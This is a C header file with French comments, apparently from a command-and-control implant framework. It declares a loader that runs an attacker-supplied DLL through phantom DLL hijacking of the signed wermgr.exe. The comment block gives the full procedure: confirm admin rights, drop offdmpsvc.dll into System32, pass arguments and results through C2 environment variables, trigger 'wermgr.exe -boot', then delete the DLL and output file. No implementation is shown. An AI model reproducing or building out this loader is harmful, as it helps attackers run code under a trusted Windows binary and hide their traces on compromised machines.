/*
 * ============================================================
 *  wermgr_loader.h - Phantom DLL via wermgr.exe (T1574.002)
 *
 *  Charge un module DLL en exploitant le phantom DLL hijacking
 *  de wermgr.exe (Windows Error Reporting Manager, signe Microsoft) :
 *
 *  1. Verifie le token eleve (System32 en ecriture)
 *  2. Ecrit la DLL dans C:\Windows\System32\offdmpsvc.dll
 *  3. Passe les args via env var  C2_ARGS_HEX    (hex little-endian)
 *  4. Signale le mode phantom via C2_PHANTOM_MODE = 1
 *  5. Definit la sortie via      C2_OUTPUT_FILE  (<temp>.bin)
 *  6. Lance : wermgr.exe -boot
 *     > wermgr.exe appelle LoadLibrary("offdmpsvc.dll")
 *     > DllMain detecte C2_PHANTOM_MODE=1, execute go(), ecrit la sortie
 *  7. Attend la fin du processus (timeout 30s)
 *  8. Lit C2_OUTPUT_FILE > module_result_t
 *  9. Supprime offdmpsvc.dll + fichier de sortie
 *
 *  MITRE ATT&CK : T1574.002 - DLL Side-Loading (Phantom DLL)
 * ============================================================
 */
#ifndef WERMGR_LOADER_H
#define WERMGR_LOADER_H

#include "execution_engine.h"

/*
 * Charge et execute une DLL module via le phantom DLL hijacking wermgr.exe.
 *
 * @param dll_bytes : bytes bruts de la DLL (.dll PE64)
 * @param dll_size  : taille en bytes
 * @param args      : arguments packes pour go() (format BeaconDataParse)
 * @param args_len  : taille des arguments (0 si aucun)
 * @return module_result_t - appeler free_module_result() apres usage
 *
 * Prerequis : processus agent doit tourner avec token eleve (admin).
 */
module_result_t wermgr_loader_execute(
    const unsigned char *dll_bytes, size_t dll_size,
    const unsigned char *args,      size_t args_len
);

#endif /* WERMGR_LOADER_H */
